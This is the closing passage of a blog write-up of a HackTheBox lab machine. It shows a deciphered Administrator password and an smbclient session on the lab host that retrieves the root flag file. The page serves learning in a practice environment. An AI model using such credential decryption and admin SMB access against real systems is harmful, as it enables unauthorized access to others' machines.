</span></span></code></pre></td></tr></table></div></div><p>This password is ciphered too, as earlier let&rsquo;s paste it in a search engine:</p><ul><li>VB.Net: <a href=https://dotnetfiddle.net/LdhDaa>https://dotnetfiddle.net/LdhDaa</a></li><li>C#: <a href=https://dotnetfiddle.net/ndCO9U>https://dotnetfiddle.net/ndCO9U</a></li></ul><p>So the deciphered password is: <code>XtH4nkS4Pl4y1nGX</code>.</p><p>Let&rsquo;s get root flag via the <code>C$</code> share with the <code>Administrator</code> account:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ smbclient &#39;\\10.10.10.178\C$&#39; -U &#39;Administrator&#39;
</span></span><span class=line><span class=cl>Unable to initialize messaging context
</span></span><span class=line><span class=cl>Enter WORKGROUP\Administrator&#39;s password: 
</span></span><span class=line><span class=cl>Try &#34;help&#34; to get a list of possible commands.
</span></span><span class=line><span class=cl>smb: \&gt; cd Users\Administrator\Desktop
</span></span><span class=line><span class=cl>smb: \Users\Administrator\Desktop\&gt; ls
</span></span><span class=line><span class=cl>  .                                  DR        0  Sun Jan 26 08:20:50 2020
</span></span><span class=line><span class=cl>  ..                                 DR        0  Sun Jan 26 08:20:50 2020
</span></span><span class=line><span class=cl>  desktop.ini                       AHS      282  Sat Jan 25 23:02:44 2020
</span></span><span class=line><span class=cl>  root.txt                            A       32  Tue Aug  6 00:27:26 2019
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                10485247 blocks of size 4096. 6545277 blocks available
</span></span><span class=line><span class=cl>smb: \Users\Administrator\Desktop\&gt; mget root.txt
</span></span><span class=line><span class=cl>Get file root.txt? y
</span></span><span class=line><span class=cl>getting file \Users\Administrator\Desktop\root.txt of size 32 as root.txt (0,3 KiloBytes/sec) (average 0,3 KiloBytes/sec)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ cat root.txt
</span></span><span class=line><span class=cl>6594c2eb084bc0f08a42f0b94b878c41
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/windows/>Windows</a></li><li><a href=https://s4ch.github.io/tags/easy/>Easy</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>